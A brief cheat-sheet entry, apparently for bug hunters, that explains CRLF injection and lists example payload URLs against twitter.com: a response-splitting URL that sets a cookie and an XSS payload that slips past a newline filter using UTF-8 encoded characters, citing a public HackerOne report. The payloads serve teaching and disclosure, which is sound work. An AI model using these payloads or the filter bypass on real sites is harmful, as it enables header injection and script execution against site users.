# CRLF Injection

    CRLF Injection - The term CRLF refers to Carriage Return (ASCII 13, \r) Line Feed (ASCII 10, \n). 
    
    example: https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0aSet-Cookie:%20test
    
    Using %0a%0d to split request, and set new cookie header
    
    XSS: https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
    
* Bypass - The page will set cookie for the parameter reported_tweet_id. However, it doesn't validate strictly if it is a number. Although there is a protection against CRLF injection by detecting the presence of any NewLine character (0x0a), it can be bypassed with characters encoded in UTF-8 as the the page will try to convert them back to the original Unicode form and **extract the last byte**. For example, %E5%98%8A => U+560A => 0A. see: [hackerone - CRLF Bypass](https://hackerone.com/reports/52042) - Very Nice Bypass
